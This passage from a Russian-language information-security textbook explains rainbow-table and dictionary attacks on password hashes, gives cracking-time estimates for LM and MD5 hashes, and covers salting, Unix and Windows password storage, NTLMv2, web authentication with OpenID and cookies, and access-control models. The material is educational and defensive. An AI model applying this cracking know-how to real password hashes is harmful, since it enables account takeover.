%        \multirow{3}{*}{2} & \multirow{3}{*}{6} & $0$ & $2^{26}$ & $2^{28}$ & a-z \\
%        & & $1$ & $2^{32}$ & $2^{34}$ & A-Z, a-z \\
%        & & $3$ & $2^{40}$ & $2^{39}$ & Весь алфавит \\
%        \hline
%        \multirow{3}{*}{3} & \multirow{3}{*}{9} & $0$ & $2^{39}$ & $2^{42}$ & a-z \\
%        & & $2$ & $2^{50}$ & $2^{51}$ & A-Z, a-z \\
%        & & $4$ & $2^{59}$ & $2^{59}$ & Весь алфавит \\
%        \hline
%        \multirow{3}{*}{4} & \multirow{3}{*}{12} & $0$ & $2^{52}$ & $2^{56}$ & a-z \\
%        & & $3$ & $2^{69}$ & $2^{68}$ & A-Z, a-z \\
%        & & $6$ & $2^{81}$ & $2^{77}$ & Весь алфавит \\
%        \hline
%    \end{tabular}
%    \caption{Сравнение верхней оценки числа паролей, построенных на слогах, со всем доступным множеством паролей в алфавите из $D$ символов.}
%    \label{tab:password-number}
%\end{table}
%
%Из таблицы~\ref{tab:password-number} видно, что при доступном объёме вычислений в $2^{60 \ldots 70}$ операций, пароли вплоть до 12 символов, построенные на словах, слогах, изменениях слов, вставках цифр, небольшого изменения регистров и другой простейшей обфускации, могут быть найдены перебором на кластере (или ПК) в настоящее время.


\subsubsection{Атака для подбора паролей и ключей шифрования}

В схемах аутентификации по паролю иногда используется хэширование и хранение хэша пароля на сервере. В таких случаях применима словарная атака или атака с применением заранее вычисленных таблиц для ускорения поиска.

Для нахождения пароля, прообраза хэш-функции, или для нахождения ключа блочного шифрования по атаке с выбранным шифртекстом (для одного и того же известного открытого текста и соответствующего шифртекста) может быть применён метод перебора с балансом между памятью и временем вычислений. Самый быстрый метод радужных таблиц\index{радужные таблицы} (\langen{rainbow tables}, 2003~г., \cite{Oechslin:2003}) заранее вычисляет следующие цепочки и хранит результат в памяти.

Для нахождения пароля, прообраза хэш-функции $H$, цепочка строится как
    \[ M_0 \xrightarrow{H(M_0)} h_0 \xrightarrow{R_0(h_0)} M_1 \ldots M_t \xrightarrow{H(M_t)} h_t \xrightarrow{R_t(h_t)} M_{t+1}, \]
где $R_i(h)$ -- функция редуцирования, преобразования хэша в пароль для следующего хэширования.

Для нахождения ключа блочного шифрования для одного и того же известного открытого текста $M$ таблица строится как
    \[ K_0 \xrightarrow{E_{K_0}(M)} c_0 \xrightarrow{R_0(c_0)} K_1 \ldots K_t \xrightarrow{E_{K_t}(M)} c_t \xrightarrow{R_t(c_t)} K_{t+1}, \]
где $R_i(c)$ -- функция редуцирования, преобразования шифртекста в новый ключ.

Функция редуцирования $R_i$ зависит от номера итерации, чтобы избежать дублирующихся подцепочек, которые возникают в случае коллизий между значениями в разных цепочках в разных итерациях, если $R$ постоянна. Радужная таблица размера $(m \times 2)$ состоит из строк $(M_{0,j}, M_{t+1,j})$ или $(K_{0,j}, K_{t+1,j})$, вычисленных для разных значений стартовых паролей $M_{0,j}$ или $K_{0,j}$ соответственно.

Опишем атаку на примере нахождения прообраза $\overline{M}$ хэша $\overline{h} = H(\overline{M})$. На первой итерации исходный хэш $\overline{h}$ редуцируется в сообщение $\overline{h} \xrightarrow{R_t(\overline{h})} \overline{M}_{t+1} $ и сравнивается со всеми значениями последнего столбца $M_{t+1,j}$ таблицы. Если нет совпадения, переходим ко второй итерации. Хэш $\overline{h}$ дважды редуцируется в сообщение $\overline{h} \xrightarrow{R_{t-1}(\overline{h})} \overline{M}_t \xrightarrow{H(\overline{M}_t)} \overline{h}_t \xrightarrow{R_t(\overline{h}_t)} \overline{M}_{t+1}$ и сравнивается со всеми значениями последнего столбца $M_{t+1,j}$ таблицы. Если не совпало, то переходим к третьей итерации и~т.\,д. Если для $r$-кратного редуцирования сообщение $\overline{M}_{t+1}$ содержится в таблице во втором столбце, то из совпавшей строки берётся $M_{0,j}$, и вся цепочка пробегается заново для поиска искомого сообщения $\overline{M}: ~ \overline{h} = H(\overline{M})$.

Найдём вероятность нахождения пароля в таблице. Пусть мощность множества всех паролей равна $N$. Изначально в столбце $M_{0,j}$ содержится $m_0 = m$ различных паролей. Предполагая наличие случайного отображения с пересечениями паролей $M_{0,j} \rightarrow M_{1,j}$, в $M_{1,j}$ будет $m_1$ различных паролей. Согласно задаче о размещении,
\[
    m_{i+1} = N \left( 1 - \left( 1 - \frac{1}{N} \right)^{m_i} \right) \approx N \left( 1 - e^{-\frac{m_i}{N}} \right).
\]
Вероятность нахождения пароля:
\[
    P = 1 - \prod \limits_{i=1}^t \left( 1 - \frac{m_i}{N} \right).
\]

Чем больше таблица из $m$ строк, тем больше шансов найти пароль или ключ, выполнив в наихудшем случае   $O \left( m \frac{t(t+1)}{2} \right)$ операций.

Примеры применения атаки на хэш-функциях $\textrm{MD5}$\index{хэш-функция!MD5}, $\textrm{LM} \sim \textrm{DES}_{\textrm{Password}} (\textrm{const})$ приведены в таблице~\ref{tab:rainbow-tables}.

\begin{table}[!ht]
    \centering
    \caption{Атаки на радужных таблицах на \emph{одном} ПК\label{tab:rainbow-tables}}
    \resizebox{\textwidth}{!}{ \begin{tabular}{|c|c|c|c|c|c|c|}
        \hline
        \multirow{2}{*}{\parbox{1.0cm}{\medskip\medskip \centering Длина, биты}} & \multicolumn{3}{|c|}{\parbox{4.3cm}{\medspace\centering Пароль или ключ}} &
            \multicolumn{3}{|c|}{\parbox{4.33cm}{\medspace\centering Радужная таблица}} \\
        \cline{2-7}
        & \parbox{1.0cm}{\centering Длина,\\ симв.} & \parbox{1.7cm}{\centering Множество} & \parbox{1.7cm}{\centering Мощность} &
            \parbox{1cm}{\centering Объём} & \parbox{2.23cm}{\medspace \centering Время вычисления таблиц} & \parbox{1.1cm}{\centering Время поиска} \\
        \hline \hline
        \multicolumn{7}{|c|}{Хэш LM} \\
        \hline
        \rule{0pt}{2.5ex}\multirow{3}{*}{$2 \times 56$} & \multirow{3}{*}{14} &
            A--Z & $2^{33}$ & 610 MB &  & 6 с \\
        & & A--Z, 0-9 & $2^{36}$ & 3 GB &  & 15 с \\
        & & все & $2^{43}$ & 64 GB & \parbox{2.23cm}{несколько лет} & 7 мин \\
        \hline \hline
        \multicolumn{7}{|c|}{Хэш MD5} \\
        \hline
        \rule{0pt}{2.5ex} 128 & 8 & A-Z, 0-9 & $2^{41}$ & 36 GiB & - & 4 мин \\
        \hline
    \end{tabular} }
\end{table}

\section{Аутентификация по паролю}

Из-за малой энтропии пользовательских паролей во всех системах регистрации и аутентификации пользователей применяется специальная политика безопасности. Типичные минимальные требования:
\begin{enumerate}
    \item Длина пароля от 8 символов. Использование разных регистров и небуквенных символов в паролях. Запрет паролей из словаря или часто используемых паролей. Запрет паролей в виде дат, номеров машин и других номеров.
    \item Ограниченное время действия пароля. Обязательная смена пароля по истечении срока действия.
    \item Блокирование возможности аутентификации после нескольких неудачных попыток. Ограниченное число актов аутентификации в единицу времени. Временная задержка перед выдачей результата аутентификации.
\end{enumerate}

Дополнительные меры предосторожности для пользователей:
\begin{enumerate}
    \item Не использовать одинаковые или похожие пароли для разных систем, таких как электронная почта, вход в ОС, электронная платёжная система, форумы, социальные сети. Пароль часто передаётся в открытом виде по сети. Пароль доступен администратору системы, возможны утечки конфиденциальной информации с серверов. Поэтому следует стараться выбирать случайные стойкие пароли.
    \item Не записывать пароли. Никому не сообщать пароль, даже администратору. Не передавать пароли по почте, телефону, Интернету и~т.\,д.
    \item Не использовать одну и ту же учётную запись для разных пользователей, даже в виде исключения.
    \item Всегда блокировать компьютер, когда пользователь отлучается от него, даже на короткое время.
\end{enumerate}

\section[Пароли и аутентификация в ОС]{Хранение паролей и \protect\\ аутентификация в ОС}
\selectlanguage{russian}

Для усложнения подбора пароля и избежания словарной атаки перед процедурой хэширования используется <<соль>>. \emph{<<Солью>>} (salt)\index{соль} называется (псевдо)случайная битовая строка $s$, добавляемая к аргументу $m$ (паролю) функции хэширования $h(m)$ для рандомизации хэширования одинаковых сообщений.

<<Соль>> применяется для избежания словарных атак. \emph{Словарная} атака заключается в том, что злоумышленник один раз заранее вычисляет таблицы хэшей от наиболее \emph{вероятных} сообщений, то есть составляет словарь пароль-хэш, и далее производит поиск по вычисленной таблице для взламывания исходного сообщения. Ранее словарные атаки использовались для взлома паролей $m$, которые хранились в виде обычных хэшей $h(m)$. Усовершенствованной словарной атакой является метод радужных таблиц, позволяющий практически взламывать хэши длиной до 64--128 бит. Использование <<соли>> делает невозможной словарную атаку, так как значение функции вычисляется уже не от оригинального пароля, а от конкатенации <<соли>> и пароля.

<<Соль>> может храниться как отдельное значение, единственное и уникальное для системы целиком, так и быть уникальной для каждого сохранённого пароля и храниться со значением функции хэширования:
\begin{itemize}
	\item $s ~\|~ h(s ~\|~ m)$;
	\item $s ~\|~ h(m ~\|~ s)$;
	\item $s_1 ~\|~ h(m ~\|~ s_1 ~\|~ s_2)$.
\end{itemize}

В первом случае функция хэширования вычисляется от конкатенации (склеивания) <<соли>> и пароля пользователя. Во втором случае в строке сначала идёт пароль, а потом -- <<соль>>. Это позволяет немного усложнить задачу злоумышленнику при переборе паролей (он не сможет сократить время вычисления значения функции хэширования за счёт одинакового префикса у всех аргументов функции хэширования). В третьем случае используется сразу две <<соли>> -- одна хранится вместе с паролем, а вторая выступает внешним параметром, хранящимся отдельно от базы данных паролей.

В рассмотренной ранее модели построения паролей в виде слогов с элементами небольшой модификации мы получили количество паролей около $2^{70}$ для 12-символьных паролей. Данный объём вычислений уже почти достижим. Следовательно, даже <<соль>> не защищает пароли от взлома, если у злоумышленника есть доступ к файлу с паролями или возможность неограниченных попыток аутентификации. Поэтому файлы с паролями дополнительно защищаются, а в системы аутентификации по паролю вводят ограничения на попытки неуспешной аутентификации.

\subsection[Unix]{Хранение паролей в Unix}

В ОС Unix пароль $m$ пользователя хранится в файле \texttt{/etc/shadow} в виде хэша (SHA, MD5 и~т.~д.) или результата шифрования (DES, Blowfish и~т.~д.), вычисленного с <<солью>> $s$ длиной от 2 (для функции crypt в оригинальной ОС UNIX) до 16-ти (для Blowfish в OpenBSD) ASCII-символов. То, как используется <<соль>>, зависит от используемого алгоритма. Например, в традиционном алгоритме, используемом в оригинальном UNIX, <<соль>> модифицирует s-блоки и p-блоки в протоколе DES.

Файл \texttt{/etc/shadow} доступен только привилегированным процессам, что вносит дополнительную защиту.


\subsection[Windows]{Хранение паролей и аутентификация в \protect\\ Windows}

%[MS-NLMP]: NT LAN Manager (NTLM) Authentication Protocol Specification -- 09/25/2009, Rev. 11.0
%http://blogs.technet.com/authentication/archive/2006/04/07/ntlm-s-time-has-passed.aspx
%http://technet.microsoft.com/en-us/library/cc755284(WS.10).aspx -- Windows Authentication, Updated: February 7, 2008
%http://207.46.16.252/en-us/magazine/2006.08.securitywatch.aspx - The Most Misunderstood Windows Security Setting of All Time, Jesper Johansson
%http://en.wikipedia.org/wiki/NTLM
%http://www.windowsnetworking.com/nt/atips/atips92.shtml

ОС Windows, начиная с Vista, Server 2008, Windows 7, сохраняет пароли в виде NT-хэша, который вычисляется как 128-битовый хэш MD4 от пароля в Unicode кодировке. NT-хэш не использует <<соль>>, поэтому применима словарная атака. На словарной атаке основаны программы поиска (взлома) паролей для Windows. Файл паролей называется SAM (\langen{Security Account Manager}) в случае локальной аутентификации. Если пароли хранятся на сетевом сервере, то они хранятся в специальном файле, доступ к которому ограничен.

В последнем протоколе аутентификации NTLMv2\index{протокол!NTLM}\index{протокол!NTLMv2}~\cite{MS-NLMP} пользователь для входа в свой компьютер аутентифицируется либо локально на компьютере, либо удалённым сервером, если учётная запись пользователя хранится на сервере. Пользователь с именем $user$ вводит пароль в программу-\emph{клиент}, которая, взаимодействуя с программой-\emph{сервером} (локальной или удалённой на сервере домена $domain$), аутентифицирует пользователя для входа в систему.
\begin{enumerate}
    \item Клиент $\rightarrow$ Сервер: запрос аутентификации.
    \item Клиент $\leftarrow$ Сервер: 64-битовая псевдослучайная одноразовая метка $n_s$.
    \item Вводимый пользователем пароль хэшируется в $\textrm{NThash}$ без <<соли>>. Клиент генерирует 64-битовую псевдослучайную одноразовую метку $n_c$, создаёт метку времени $ts$. Далее вычисляются 128-битовые имитовставки\index{имитовставка} $\HMAC$ на хэш-функции MD5 с ключами $\textrm{NT-hash}$ и $\textrm{NTOWF}$:
        \[ \textrm{NThash} = \text{MD4}(\text{Unicode}(\text{пароль})), \]
        \[ \textrm{NTOWF} = \textrm{HMAC-MD5}_{\textrm{NThash}}(user, domain), \]
        %\[ \text{LMv2-response} = \text{HMAC-MD5}_{\text{NTLMv2-hash}}(n_c, n_s), \]
        \[ \textrm{NTLMv2-response} = \textrm{HMAC-MD5}_{\textrm{NTOWF}}(n_c, n_s, ts, domain). \]
    \item Клиент $\rightarrow$ Сервер: $(n_c, \textrm{NTLMv2-response})$. %LMv2-response,
    \item Сервер для указанных имён пользователя и домена извлекает из базы паролей требуемый NT-hash, производит аналогичные вычисления и сравнивает значения имитовставок. Если они совпадают, аутентификация успешна.
\end{enumerate}

В случае аутентификации на локальном компьютере сравниваются значения $\textrm{NTOWF}$: вычисленные от пароля пользователя и извлечённые из файла паролей SAM.

Как видно, протокол аутентификации NTLMv2 обеспечивает одностороннюю аутентификацию пользователя серверу (или своему ПК).

При удалённой аутентификации по сети последние версии Windows используют протокол Kerberos, который обеспечивает взаимную аутентификацию, и, только если аутентификация по Kerberos не поддерживается клиентом или сервером, она происходит по NTLMv2.


\section{Аутентификация в веб-сервисах}
\selectlanguage{russian}

Протокол HTTP\index{протокол!HTTP} (вместе с HTTPS\index{протокол!HTTPS}) является в настоящий момент наиболее популярным протоколом, использующимся в сети Интернет для доступа к сервисам, таким как социальные сети или веб-клиенты электронной почты. Данный протокол является протоколом запрос-ответ\index{протокол!запрос-ответ}, причём для каждого запроса открывается новое соединение с сервером\footnote{Для версии протокола HTTP/1.0 существует неофициальное~\cite[p.~17]{Totty:2002} расширение в виде заголовка \texttt{Connection: Keep-Alive}, который позволяет использовать одно соединение для нескольких запросов. Версия протокола HTTP/1.1 по умолчанию~\cite[6.3.~Persistence]{rfc7230} устанавливает поддержку выполнения нескольких запросов в рамках одного соединения. Однако все запросы всё равно выполняются независимо друг от друга.}. То есть протокол HTTP не является сессионным протоколом\index{протокол!сессионный}. В связи с этим задачу аутентификации на веб-сервисах можно различить на задачи первичной и вторичной аутентификации. \textit{Первичной аутентификацией}\index{аутентификация!первичная} будем называть механизм обычной аутентификации пользователя в рамках некоторого HTTP-запроса, а \textit{вторичной}\index{аутентификация!вторичная} (или \textit{повторной}\index{аутентификация!повторная}) -- некоторый механизм подтверждения в рамках последующих HTTP-запросов, что пользователь уже был \textit{ранее} аутентифицирован веб-сервисом в рамках первичной аутентификации.

Аутентификация в веб-сервисах также бывает \textit{односторонней}\index{аутентификация!односторонняя} (как со стороны клиента, так и со стороны сервиса) и \textit{взаимной}\index{аутентификация!взаимная}. Под аутентификацией веб-сервиса обычно понимается возможность сервиса доказать клиенту, что он является именно тем веб-сервисом, к которому хочет получить доступ пользователь, а не его мошеннической подменой, созданной злоумышленниками. Для аутентификации веб-сервисов используется механизм сертификатов открытых ключей\index{сертификат открытого ключа} протокола HTTPS\index{протокол!HTTPS} с использованием инфраструктуры открытых ключей\index{инфраструктура открытых ключей} (см. раздел~\ref{chapter-public-key-infrastructure}).

При использовании протокола HTTPS\index{протокол!HTTPS} и наличии соответствующей поддержки со стороны веб-сервиса клиент также имеет возможность аутентифицировать себя с помощью своего сертификата открытого ключа\index{сертификат открытого ключа}. Данный механизм редко используется в публичных веб-сервисах, так как требует от клиента иметь на устройстве, с которого осуществляется доступ, файл сертификата открытого ключа.

\subsection{Первичная аутентификация по паролю}

Стандартная первичная аутентификация в современных веб-сервисах происходит обычной передачей логина и пароля в открытом виде по сети. Если SSL-соединение не используется, логин и пароль могут быть перехвачены. Даже при использовании SSL-соединения веб-приложение имеет доступ к паролю в открытом виде.

Более защищённым, но мало используемым способом аутентификации является вычисление хэша от пароля $m$, соли $s$ и псевдослучайных одноразовых меток $n_1, n_2$ с помощью JavaScript в браузере и отсылка по сети только результата вычисления хэша.
\[ \begin{array}{ll}
    \text{Браузер} ~\rightarrow~ \text{Сервис:} & \text{HTTP GET-запрос} \\
    \text{Браузер} ~\leftarrow~ \text{Сервис:}  & s ~\|~ n_1 \\
    \text{Браузер} ~\rightarrow~ \text{Сервис:} & n_2 ~\|~ h( h(s ~\|~ m) ~\|~ n_1 ~\|~ n_2) \\
\end{array} \]

Если веб-приложение хранит хэш от пароля и соли $h(s ~\|~ m)$, то пароль не может быть перехвачен ни по сети, ни веб-приложением.

В массовых интернет-сервисах пароли часто хранятся в открытом виде на сервере, что не является хорошей практикой для обеспечения защиты персональных данных пользователей.

\subsection{Первичная аутентификация в OpenID}
\selectlanguage{russian}

Из-за большого числа различных логинов, которые приходится использовать для доступа к разным сервисам, постепенно происходит внедрение единых систем аутентификации для разных сервисов (single sign-on), например OpenID. Одновременно происходит концентрация пользователей вокруг больших порталов с единой аутентификацией, например Google Account. Яндекс.Паспорт также уменьшает число используемых паролей для разных служб.

Принцип аутентификации состоит в следующем:
\begin{enumerate}
    \item Пользователи и интернет-сервисы доверяют аутентификацию третьей стороне -- центру единой аутентификации;
    \item Когда пользователь заходит на интернет-ресурс, веб-приложение перенаправляет его на центр аутентификации с защитой TLS-соединением;
    \item Центр аутентифицирует пользователя и выдаёт ему токен аутентификации, который пользователь предъявляет интернет-сервису;
    \item Сервис по токену аутентификации определяет имя пользователя.
\end{enumerate}

\begin{figure}[!ht]
	\centering
	\includegraphics[width=0.9\textwidth]{pic/openid}
	\caption{Схема аутентификации в OpenID\label{fig:openid}}
\end{figure}

На рис.~\ref{fig:openid} показана схема аутентификации в OpenID версии 2 для доступа к стороннему интернет-сервису.

Если сервис и центр вместе создают общий секретный ключ $K$ для имитовставки\index{имитовставка} $\MAC_K$, выполняются шаги 4, 5 по протоколу Диффи~---~Хеллмана\index{протокол!Диффи~---~Хеллмана}:
\[ \begin{array}{l}
    \text{4. Сервис} ~\rightarrow~ \text{центр: модуль}~ p ~\text{группы}~ \Z_p^*, ~\text{генератор}~ g, \\
        ~~~~~~~~~~~~~~~\text{число}~ g^a \mod p, \\
    \text{5. Сервис} ~\leftarrow~ \text{центр: число}~ g^b \mod p, ~\text{гаммированный} \\
        ~~~~~~~~~~~~~~~\text{ключ}~ K \oplus (g^{ab} \mod p),
\end{array} \]
то аутентификатор содержит $\MAC_K$, проверяемый шагом 10, на выданном ключе $K$\footnote{Более правильным подходом является использование в качестве ключа $K = g^{ab} \mod p$, так как в этом случае ключ создаётся совместно, а не выдаётся центром.}. Имитовставка\index{имитовставка} определяется как описанный ранее $\HMAC$ с хэш-функцией SHA-256.

Если сервис и центр не создают общий ключ (этапы 4, 5 не выполняются), то сервис делает запрос на проверку аутентификатора в шагах 10, 11.

В OpenID аутентификатор состоит из следующих основных полей: имени пользователя, URL сервиса, результата аутентификации в OpenID, одноразовой метки и, возможно, кода аутентификации от полей аутентификатора на секретном ключе $K$, если он был создан на этапах 4, 5. Одноразовая метка является \emph{одноразовым} псевдослучайным идентификатором результата аутентификации, который центр сохраняет в своей БД. По одноразовой метке сервис запрашивает центр о верности результата аутентификации на этапах 10, 11. Одноразовая метка дополнительно защищает от атак воспроизведения.

Можно было бы исключить шаги 4, 5, 10, 11, но тогда сервису бы пришлось реализовывать и хранить в БД использованные одноразовые метки для защиты от атак воспроизведения. Цель OpenID -- предоставить аутентификацию с минимальными издержками на интеграцию. Поэтому в OpenID реализуется модель, в которой сервис все проверки делегирует запросами к центру.

Важно отметить, что в аутентификации через OpenID необходимо использовать TLS-соединения\index{протокол!SSL/TLS} (то есть протокол HTTPS\index{протокол!HTTPS}) на всех взаимодействиях с центром, так как в самом протоколе OpenID не производится аутентификация сервиса и центра, конфиденциальность и целостность не поддерживаются.


\subsection{Вторичная аутентификация по cookie}
\selectlanguage{russian}

Если сервер использует первичную аутентификацию по паролю, который передаётся в виде данных POST-запроса, то осуществлять подобную передачу данных при каждом обращении неудобно. Клиент должен иметь возможность доказать серверу, что он уже прошёл первичную аутентификацию. Должен быть предусмотрен механизм вторичной аутентификации. Для этого используется случайный токен, который уникален для каждого пользователя (обычно -- для каждого сеанса работы пользователя), который сервер передаёт пользователю после первичной аутентификации. Данный токен должен передаваться клиентом на сервис при каждом обращении к страницам, которые относятся к защищённой области сервиса. На практике применяются следующие механизмы для передачи данного токена при каждом запросе:

\begin{itemize}
	\item Первым способом является модификация вывода страницы клиенту, которая добавляет ко всем URL в HTML-коде страницы этот токен. В результате, переходя по ссылкам на HTML-странице (а также заполняя формы и отправляя их на сервер), клиент будет автоматически отправлять токен как часть запроса в URL-адресе страницы:

\texttt{http://tempuri.org/page.html?token=12345.}
	\item Вторым способом является использование механизма cookie (<<куки>>, <<кукиз>>, на русский обычно не переводится, подробнее см.~\cite[Client Identification and Cookies]{Totty:2002}). Данный механизм позволяет серверу передать пользователю некоторую строку, которая будет отправляться на сервер при каждом последующем запросе.
\end{itemize}

Основным механизмом для вторичной аутентификации пользователей в веб-сервисах является механизм cookie, а токены, как часть URL, используются в распределённых системах вроде уже рассмотренной OpenID, так как сервисы, находящиеся в разных доменах, не имеют доступа к общим cookie. Далее рассмотрим подробнее механизм использования cookie.

Когда браузер в первый раз делает HTTP-запрос:
\begin{center} \begin{verbatim}
GET /index.html HTTP/1.1
Host: www.wikipedia.org
Accept: */*
\end{verbatim} \end{center}

В заголовок ответа сервера веб-приложение может добавить заголовок \texttt{Set-Cookie}, который содержит новые значения cookie:
\begin{center} \begin{verbatim}
HTTP/1.1 200 OK
Content-type: text/html
Set-Cookie: name1=value1; name2=value2; ...

...далее HTML-страница...
\end{verbatim} \end{center}

Браузер, если это разрешено настройками, при последующих запросах к веб-серверу автоматически будет отсылать cookie назад веб-приложению:
\begin{center} \begin{verbatim}
GET /wiki/HTTP_cookie HTTP/1.1
Host: www.wikipedia.org
Cookie: name1=value1; name2=value2; ...
Accept: */*
\end{verbatim} \end{center}

Далее веб-приложение может создать новый cookie, изменить значение старого и~т.\,д. Браузер хранит cookie на устройстве клиента. То есть cookie -- это возможность хранить переменные на устройстве клиента, отсылать сохранённые значения, получать новые переменные. В результате создаётся передача состояний, что даёт возможность не вводить логин и пароль каждый раз при входе в интернет-сервис, использовать несколько окон для одного сеанса работы в интернет-магазине и~т.\,д. При создании cookie может указываться его конечное время действия, после которого браузер удалит устаревший cookie.

Для вторичной аутентификации веб-приложение записывает в cookie токен в виде текстовой строки. В качестве токена можно использовать \emph{псевдослучайную} текстовую строку достаточной длины, созданную веб-приложением. Например:
\begin{center} \begin{verbatim}
Cookie: auth=B35NMVNASUY26MMWNVZ87.
\end{verbatim} \end{center}

В этом случае веб-сервис должен вести журнал выданных токенов пользователям и их сроков действия. Если информационная система небольшого размера (один или десятки серверов), то вместо журнала может использоваться механизм session storage:
\begin{itemize}
	\item При первом заходе на сайт сервер приложений (платформа исполнения веб-приложения) <<назначает>> клиенту сессию, отправляя ему через механизм cookie новый (псевдо) случайный токен сессии, а в памяти сервера выделяя структуру, которая недоступна самому клиенту, но которая соответствует данной конкретной сессии.
	\item При каждом последующем обращении клиент передаёт токен (идентификатор) сессии с помощью механизма cookie. Сервер приложений берёт из памяти соответствующую структуру сессии и передаёт её приложению вместе с параметрами запроса.
	\item В момент прохождения первичной аутентификации приложение добавляет в указанную область памяти ссылку на информацию о пользователе.
	\item При последующих обращениях приложение использует информацию о пользователе, записанную в области памяти сессии клиента.
	\item Сессия автоматически стирается из памяти после прохождения некоторого времени неактивности клиента (что контролируется настройками сервера), либо если приложение явно вызвало функцию инвалидации сессии (\langen{invalidate}).
\end{itemize}

Плюсом использования session storage является то, что этот механизм уже реализован в большинстве платформ для построения веб-приложений (см., например, \cite[Controlling sessions]{Brittain:Darwin:2007}). Его минусом является сложность синхронизации структур сессий в памяти серверов для распределённых информационных систем большого размера.

Вторым способом вторичной аутентификации с использованием cookie является непосредственное включение аутентификационных данных (идентификатор пользователя, срок действия) в cookie вместо случайного токена. К данным в обязательном порядке добавляется имитовставка\index{имитовставка} по ключу, который известен только сервису. С одной стороны, данный подход может значительно увеличить размер передаваемых cookie. С другой -- он облегчает вторичную аутентификацию в распределённых системах, так как промежуточным сервисом хранения факта прошедшей аутентификации является только клиент, а не сервер.

Конечно, беспокоиться об аутентификации в веб-сервисах при использовании обычного HTTP-протокола\index{протокол!HTTP} без зашифрованного SSL-соединения\index{протокол!SSL/TLS} имеет смысл только по отношению к угадыванию токенов аутентификации другими пользователями, которые не имеют доступа к маршрутизаторам и сети, через которые клиент общается с сервисом. Кража компьютера или одного cookie-файла и перехват незащищённого трафика протокола HTTP\index{протокол!HTTP} приводят к доступу в систему под именем взломанного пользователя.



\chapter{Программные уязвимости}

\section[Контроль доступа в информационных системах]{Контроль доступа в \protect\\ информационных системах}
\selectlanguage{russian}

%http://www.acsac.org/2005/papers/Bell.pdf
%http://www.dranger.com/iwsec06_co.pdf
%http://csrc.nist.gov/groups/SNS/rbac/documents/design_implementation/Intro_role_based_access.htm
%http://en.wikipedia.org/wiki/Access_control#Computer_security
%http://en.wikipedia.org/wiki/Discretionary_access_control
%http://en.wikipedia.org/wiki/Mandatory_access_control
%http://en.wikipedia.org/wiki/Role-Based_Access_Control

В информационных системах контроль доступа вводится на \emph{действия} \emph{субъектов} над \emph{объектами}. В операционных системах под субъектами почти всегда понимаются процессы, под объектами -- процессы, разделяемая память, объекты файловой системы, порты ввода-вывода и т.~д., под действием -- чтение (файла или содержимого директории), запись (создание, добавление, изменение, удаление, переименование файла или директории) и исполнение (файла-программы). Система контроля доступа в информационной системе (операционной системе, базе данных и т.~д.) определяет множество субъектов, объектов и действий.

Применение контроля доступа создаётся:

\begin{enumerate}
	\item \emph{аутентификацией} субъектов и объектов,
	\item \emph{авторизацией} допустимости действия,
	\item \emph{аудитом} (проверкой и хранением) ранее совершённых действий.
\end{enumerate}

Различают три основные модели контроля доступа: дискреционная\index{управление доступом!дискреционное} (discretionary access control, DAC), мандатная\index{управление доступом!мандатное} (mandatory access control, MAC) и ролевая\index{управление доступом!ролевое} (role-based access control, RBAC) модели. Современные операционные системы используют \emph{комбинации} двух или трёх моделей доступа, причём решения о доступе принимаются в порядке убывания приоритета: ролевая, мандатная, дискреционная модели.

Системы контроля доступа и защиты информации в операционных системах используются не только для защиты от злоумышленника, но и для повышения устойчивости системы в целом. Однако появление новых механизмов в новых версиях ОС может привести к проблемам совместимости с уже существующим программным обеспечением.

\subsection{Дискреционная модель}

Классическое определение из так называемой Оранжевой книги (Trusted Computer System Evaluation Criteria, устаревший стандарт министерства обороны США 5200.28-STD, 1985 г.~\cite{DOD-5200.28-STD}) следующее: дискреционная модель\index{контроль доступа!дискреционный} -- средства ограничения доступа к объектам, основанные на сущности (identity) субъекта и/или группы, к которой они принадлежат. Субъект, имеющий определённый доступ к объекту, имеет возможность полностью или частично передать право доступа другому субъекту.

На практике дискреционная модель доступа предполагает, что для каждого объекта в системе определён субъект-владелец. Этот субъект может самостоятельно устанавливать необходимые, по его мнению, права доступа к любому из своих объектов для остальных субъектов, в том числе и для себя самого. Логически владелец объекта является владельцем информации, находящейся в этом объекте. При доступе некоторого субъекта к какому-либо объекту система контроля доступа лишь считывает установленные для объекта права доступа и сравнивает их с правами доступа субъекта. Кроме того, предполагается наличие в ОС некоторого выделенного субъекта -- администратора дискреционного управления доступом, который имеет привилегию устанавливать дискреционные права доступа для любых, даже ему не принадлежащих, объектов в системе.

Дискреционную модель реализуют почти все популярные ОС, в частности Windows и Unix. У каждого субъекта (процесса пользователя или системы) и объекта (файла, другого процесса и т.~д.) есть владелец, который может делегировать доступ другим субъектам, изменяя атрибуты на чтение, запись файлов для других пользователей и групп пользователей. Администратор системы имеет возможность назначить нового владельца и другие права доступа к объектам.


\subsection{Мандатная модель}

Классическое определение мандатной модели\index{контроль доступа!мандатный} из Оранжевой книги: средства ограничения доступа к объектам, основанные на важности (секретности) информации, содержащейся в объектах, и обязательная авторизация действий субъектов для доступа к информации с присвоенным уровнем важности. Важность информации определяется уровнем доступа, приписываемым всем объектам и субъектам. Исторически мандатная модель определяла важность информации в виде иерархии, например, совершенно секретно (СС), секретно (С), конфиденциально (К) и рассекречено (Р). При этом верно следующее: СС $\supset$ C $\supset$ K $\supset$ P, то есть каждый уровень включает сам себя и все уровни, находящиеся ниже в иерархии.

Современное определение мандатной модели -- применение явно указанных правил доступа субъектов к объектам, определяемых только администратором системы. Сами субъекты (пользователи) не имеют возможности для изменения прав доступа. Правила доступа описаны матрицей, в которой столбцы соответствуют субъектам, строки -- объектам, а в ячейках содержатся допустимые действия субъекта над объектом. Матрица покрывает всё пространство субъектов и объектов. Также определены правила наследования доступа для новых создаваемых объектов. В мандатной модели матрица может быть изменена только администратором системы.

Модель Белла --- Ла Падулы\index{модель!Белла --- Ла Падулы} (Bell --- LaPadula,~\cite{Bell:LaPadula:1973, Bell:LaPadula:1976}) использует два мандатных и одно дискреционное правила политики безопасности.
\begin{enumerate}
    \item Субъект с определённым уровнем секретности не может иметь доступ на \emph{чтение} объектов с более \emph{высоким} уровнем секретности (no read-up).
    \item Субъект с определённым уровнем секретности не может иметь доступ на \emph{запись} объектов с более \emph{низким} уровнем секретности (no write-down).
    \item Использование матрицы доступа субъектов к объектам для описания дискреционного доступа.
\end{enumerate}

\subsection{Ролевая модель}

Ролевая модель доступа основана на определении ролей в системе\index{контроль доступа!ролевой}. Понятие <<роль>> в этой модели~--- это совокупность действий и обязанностей, связанных с определённым видом деятельности. Таким образом, достаточно указать тип доступа к объектам для определённой роли и определить группу субъектов, для которых она действует.
